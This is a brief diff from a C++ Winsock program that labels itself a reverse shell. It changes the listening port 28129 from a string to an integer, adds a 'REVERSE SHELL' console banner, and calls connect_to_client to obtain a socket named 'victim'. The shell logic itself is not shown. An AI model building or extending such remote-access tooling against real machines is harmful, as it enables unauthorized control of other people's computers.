@@ -8,13 +8,16 @@
 #include "connections.hpp"
 #pragma comment(lib, "Ws2_32.lib")
 
-#define port "28129"
+#define port 28129
 
 // TODO: Arreglar el tema de q el hilo secundario aun sigue aun q se cause un error en el hilo principal causa error
 
 
 int main()
 {
+    std::cout << "############################\n";
+    std::cout << "##      REVERSE SHELL     ##\n";
+    std::cout << "############################\n";
     SOCKET victim = connect_to_client(port);
 
     // TODO: Mover esto a otra parte o ponerlo en una clase
